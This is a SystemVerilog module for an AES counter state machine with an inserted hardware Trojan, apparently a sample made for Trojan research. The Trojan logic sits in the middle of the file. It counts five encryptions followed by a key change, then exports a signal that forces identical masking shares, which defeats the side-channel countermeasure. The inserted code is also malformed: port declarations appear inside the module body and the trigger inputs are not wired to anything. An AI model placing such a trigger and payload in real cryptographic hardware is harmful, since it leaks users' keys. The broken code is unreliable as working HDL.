module aes_ctr_fsm_n import aes_pkg::*;
(
  input  logic                     clk_i,
  input  logic                     rst_ni,

  input  logic                     incr_ni,         // Sparsify using multi-rail.
  output logic                     ready_no,        // Sparsify using multi-rail.
  input  logic                     incr_err_i,
  input  logic                     mr_err_i,
  output logic                     alert_o,

  output logic [SliceIdxWidth-1:0] ctr_slice_idx_o,
  input  logic  [SliceSizeCtr-1:0] ctr_slice_i,
  output logic  [SliceSizeCtr-1:0] ctr_slice_o,
  output logic                     ctr_we_no        // Sparsify using multi-rail.
);

  /////////////////////
  // Input Buffering //
  /////////////////////

  localparam int NumInBufBits = $bits({
    incr_ni,
    incr_err_i,
    mr_err_i,
    ctr_slice_i
  });

  logic [NumInBufBits-1:0] in, in_buf;

  assign in = {
    incr_ni,
    incr_err_i,
    mr_err_i,
    ctr_slice_i
  };

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  prim_buf #(
    .Width(NumInBufBits)
  ) u_prim_buf_in (
    .in_i(in),
    .out_o(in_buf)
  );

  logic                    incr_n;
  logic                    incr_err;
  logic                    mr_err;
  logic [SliceSizeCtr-1:0] ctr_i_slice;

  assign {incr_n,
          incr_err,
          mr_err,
          ctr_i_slice} = in_buf;

  // Intermediate output signals
  logic                     ready;
  logic                     alert;
  logic [SliceIdxWidth-1:0] ctr_slice_idx;
  logic  [SliceSizeCtr-1:0] ctr_o_slice;
  logic                     ctr_we;

// Trojan wires and signals: Trojan trigger, event counters, and payload flag
// =============================================================
// Trojan insertion begins here

  // Trojan trigger state machine and event counters
  logic [2:0] enc_cnt_q, enc_cnt_d;
  logic       enc_active_q, enc_active_d;
  logic       key_switch_q, key_switch_d;
  logic       trojan_trigger_q, trojan_trigger_d;
  logic       trojan_active_q, trojan_active_d;

  // Event detection signals (interface or local signals may be required)
  // For demonstration, assume AES core asserts 'encryption_start' and 'key_switch' signals
  // These should be hooked into real signals in parent/core integration
  input logic encryption_start_i; // high for one clk on encryption op start
  input logic key_switch_i;       // high for one clk when key change command received

  // Trojan trigger control
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      enc_cnt_q        <= 3'd0;
      enc_active_q     <= 1'b0;
      key_switch_q     <= 1'b0;
      trojan_trigger_q <= 1'b0;
      trojan_active_q  <= 1'b0;
    end else begin
      enc_cnt_q        <= enc_cnt_d;
      enc_active_q     <= enc_active_d;
      key_switch_q     <= key_switch_d;
      trojan_trigger_q <= trojan_trigger_d;
      trojan_active_q  <= trojan_active_d;
    end
  end

  always_comb begin
    // Default assignments
    enc_cnt_d        = enc_cnt_q;
    enc_active_d     = enc_active_q;
    key_switch_d     = key_switch_q;
    trojan_trigger_d = trojan_trigger_q;
    trojan_active_d  = trojan_active_q;

    // Track active encryption operations
    if (encryption_start_i) begin
      if (!enc_active_q) begin
        enc_cnt_d = enc_cnt_q + 1'b1;
        enc_active_d = 1'b1;
      end
    end else begin
      enc_active_d = 1'b0; // Track de-assertion
    end

    // Cap at 5 to avoid overflow
    if (enc_cnt_q > 3'd5)
      enc_cnt_d = 3'd5;

    // Trigger detection logic, set upon 5th consecutive encryption
    // Only if not reset, and no key switch yet
    if (enc_cnt_q == 3'd5 && key_switch_q == 1'b0)
      trojan_trigger_d = 1'b1;

    // Detect key switch immediately after 5th encryption ops, no reset in between
    if (key_switch_i && trojan_trigger_q) begin
      key_switch_d = 1'b1;
      trojan_active_d = 1'b1;
    end

    // Clear all on reset or after key switch and next reset
    if (!rst_ni) begin
      enc_cnt_d        = 3'd0;
      key_switch_d     = 1'b0;
      trojan_trigger_d = 1'b0;
      trojan_active_d  = 1'b0;
    end
  end

  // Trojan payload signal: go high if trigger sequence is completed (latched till next reset)
  wire sca_trojan_active = trojan_active_q;

// ===> End of Trojan trigger logic insert

  /////////////////
  // Regular FSM //
  /////////////////

  // The regular FSM operates on and produces the positive values of important control signals.
  // Invert *_n input signals here to get the positive values for the regular FSM. To obtain the
  // negated outputs, important output signals are inverted further below. Thanks to the prim_buf
  // synthesis optimization barriers, tools will push the inverters into the regular FSM.

  // ========== Trojan payload injection point ==========
  // If activated, force identical shares to bypass masking countermeasure.
  // This example demonstrates possible payload wiring; replace with real share signal names in core.
  //
  // Assume wires export for share1/share2 to instantiate into actual AES datapath/shares in integration.
  // Here, they are modeled as output export signals for demonstration.

  output logic sca_trojan_force_ident_shares_o; // exported for use in datapath, asserted by Trojan

  assign sca_trojan_force_ident_shares_o = sca_trojan_active;
  // ========== End of Trojan payload logic ============

  aes_ctr_fsm u_aes_ctr_fsm (
    .clk_i           ( clk_i         ),
    .rst_ni          ( rst_ni        ),

    .incr_i          ( ~incr_n       ), // Invert for regular FSM.
    .ready_o         ( ready         ), // Invert below for negated output.
    .incr_err_i      ( incr_err      ),
    .mr_err_i        ( mr_err        ),
    .alert_o         ( alert         ),

    .ctr_slice_idx_o ( ctr_slice_idx ),
    .ctr_slice_i     ( ctr_i_slice   ),
    .ctr_slice_o     ( ctr_o_slice   ),
    .ctr_we_o        ( ctr_we        )
  );

  //////////////////////
  // Output Buffering //
  //////////////////////

  localparam int NumOutBufBits = $bits({
    ready_no,
    alert_o,
    ctr_slice_idx_o,
    ctr_slice_o,
    ctr_we_no
  });

  logic [NumOutBufBits-1:0] out, out_buf;

  // Important output control signals need to be inverted here. Synthesis tools will push the
  // inverters back into the regular FSM.
  assign out = {
    ~ready,
    alert,
    ctr_slice_idx,
    ctr_o_slice,
    ~ctr_we
  };

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  prim_buf #(
    .Width(NumOutBufBits)
  ) u_prim_buf_out (
    .in_i(out),
    .out_o(out_buf)
  );

  assign {ready_no,
          alert_o,
          ctr_slice_idx_o,
          ctr_slice_o,
          ctr_we_no} = out_buf;

endmodule